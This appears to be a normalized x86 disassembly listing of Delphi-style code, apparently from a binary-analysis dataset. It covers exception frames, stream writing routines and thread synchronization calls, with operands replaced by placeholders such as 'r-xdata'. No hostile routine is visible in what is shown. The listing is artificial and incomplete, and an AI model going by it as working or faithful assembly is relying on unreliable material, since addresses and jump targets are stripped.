pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_40408c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414da4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42004c
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41f2f0
jmp r-xdata
sub_420380
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42043d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415754
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d500
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420cfc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420444
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_405934
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_42004c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41f2f0
sub_42045c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4204f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415678
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_40357c
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_40429c
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f2f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420cfc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4204fe
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_420504
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_42055d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4155f8
mov eax [ ebp + 0x8 ]
push eax
call sub_41fca0
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4206b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420564
lea eax [ ebp - 0x10 ]
call sub_40f1ec
retn
sub_420568
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420d10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41fb38
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f59c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414da4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420626 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414da4
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41fe98
pop ecx
jmp r-xdata
push ebp
call sub_41ff58
pop ecx
jmp r-xdata
push ebp
call sub_41ffd4
pop ecx
jmp r-xdata
push ebp
call sub_420174
pop ecx
jmp r-xdata
push ebp
call sub_42045c
pop ecx
jmp r-xdata
push ebp
call sub_420504
pop ecx
jmp r-xdata
push ebp
call sub_41ff98
pop ecx
jmp r-xdata
push ebp
call sub_420380
pop ecx
sub_4206b4
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420a90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4143f4
test al al
je r-xdata
mov eax ebx
call sub_41428c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_4114e0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f2cc
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40fb90
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f3b4
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412c18
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420c48
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a97
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x34 ]
call sub_405934
lea eax [ ebp - 0x30 ]
call sub_404038
lea eax [ ebp - 0x2c ]
call sub_404744
lea eax [ ebp - 0x1c ]
call sub_405934
retn
xor eax eax
push ebp
push sub_420a34
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_4146ec
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420732 ]
mov eax ebx
call sub_410654
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f428
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410f98
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_4124f0
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420bf4
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405934
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_4131f0
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d500
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420cfc
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420cfc
jmp r-xdata
mov eax ebx
call sub_4114e0
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f284
jmp r-xdata
mov eax ebx
call sub_4114e0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f260
jmp r-xdata
mov eax ebx
call sub_411e3c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f2a8
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_4124f0
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420bf4
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420cfc
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420cfc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba70
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4209c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031f8
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_40429c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420bf4
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41eaa4
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41eaa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4209d0
mov eax [ ebp - 0x14 ]
call sub_4032a8
retn
sub_4209d0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420cfc
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41eaa4
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41eaa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a8
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_420ab0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420af6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_404344
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420afd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_420b14
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41eaa4
mov eax esi
call sub_4044f8
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41eaa4
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420b5c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404444
je r-xdata
mov eax esi
call sub_4042f8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042f8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41eaa4
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41eaa4
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41eaa4
mov dl 0x6
mov eax ebx
call sub_420cfc
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41eaa4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41eaa4
sub_420bf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420c39
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405da8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c40
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_420c48
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420cee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405c58
mov eax [ ebp - 0x8 ]
call sub_4042f8
mov edi eax
mov eax ebx
call sub_4048b0
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420cfc
mov eax ebx
call sub_4048b0
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41eaa4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41eaa4
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4042c0
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420b5c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420cf5
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_420d10
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420da8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
call sub_420d80
mov eax ebx
call sub_420d8c
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420f36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420f17
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420f1e
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4188d4
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4187c4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420ee1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420f48
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_421100
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_420f94
push ebx
push esi
push ecx
call sub_403674
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4211e8
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_421190
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418ef8
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_421158
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40365c
lea eax [ ebx + 0x14 ]
call sub_40d4f0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4188d4
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_421018
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418930
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418778
mov edx ebx
mov eax esi
call sub_421018
sub_4210ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418778
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x10 ] eax
sub_4210d8
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418a70
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4032a8
xor eax eax
mov [ ebx + 0x10 ] eax
sub_421100
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034a4
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4210ac
mov dl 0x1
mov eax ebx
call sub_421620
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4215d0
sub_421158
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_421620
mov edx ebx
mov eax esi
call sub_4210d8
pop edi
pop esi
pop ebx
retn
sub_421190
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4189bc
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_421158
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4210d8
sub_4211e8
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4188d4
call sub_4211e8
inc edi
dec esi
jne r-xdata
sub_421224
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418a70
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4032a8
xor eax eax
mov [ ebx + 0x14 ] eax
sub_421248
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421224
mov edx ebx
mov eax esi
call sub_421224
pop esi
pop ebx
retn
sub_421264
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_421248
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4188d4
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4212c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_42106c
push ebx
push sub_421094
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_421080
push ebx
push sub_4210a0
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4213b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408048
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_421450
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
sub_421450
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4188d4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408048
test al al
jne r-xdata
sub_4214a0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404444
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_4081cc
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
xor edx edx
mov eax ebx
call sub_421620
mov edx esi
mov eax ebx
call sub_42152c
mov dl 0x1
mov eax ebx
call sub_421620
sub_421540
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4188d4
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418860
sub_42157c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_418930
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4187c4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_418950
sub_4215d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_42156c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_421540
mov cl 0x1
mov edx ebx
call sub_4215d0
inc edi
dec ebp
jne r-xdata
sub_421620
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4042d4
mov edx esp
mov eax esi
call sub_4035bc
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_421668
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
